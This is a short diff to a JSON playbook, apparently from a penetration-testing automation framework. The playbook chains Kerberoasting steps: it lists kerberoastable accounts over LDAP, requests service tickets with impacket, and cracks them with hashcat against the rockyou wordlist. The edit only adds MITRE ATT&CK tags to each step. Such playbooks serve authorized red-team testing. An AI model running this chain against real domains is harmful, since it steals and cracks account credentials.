@@ -8,8 +8,8 @@
     { "name": "wordlist", "description": "Password wordlist path", "default": "/usr/share/wordlists/rockyou.txt" }
   ],
   "steps": [
-    { "id": "kerberoastable", "tool": "cme_ldap", "params": { "target": "{{dc}}", "username": "{{username}}", "action": "kerberoastable" }, "on_fail": "stop" },
-    { "id": "ticket", "tool": "impacket_get_st", "params": { "target": "{{dc}}", "username": "{{username}}", "domain": "{{domain}}", "spn": "${kerberoastable.text}" }, "on_fail": "continue" },
-    { "id": "crack", "tool": "hashcat_crack", "params": { "hash_file": "${ticket.text}", "hash_type": "13100", "wordlist": "{{wordlist}}" }, "on_fail": "continue" }
+    { "id": "kerberoastable", "tool": "cme_ldap", "params": { "target": "{{dc}}", "username": "{{username}}", "action": "kerberoastable" }, "on_fail": "stop", "mitre": ["T1558.003"] },
+    { "id": "ticket", "tool": "impacket_get_st", "params": { "target": "{{dc}}", "username": "{{username}}", "domain": "{{domain}}", "spn": "${kerberoastable.text}" }, "on_fail": "continue", "mitre": ["T1558.003"] },
+    { "id": "crack", "tool": "hashcat_crack", "params": { "hash_file": "${ticket.text}", "hash_type": "13100", "wordlist": "{{wordlist}}" }, "on_fail": "continue", "mitre": ["T1110.002"] }
   ]
 }
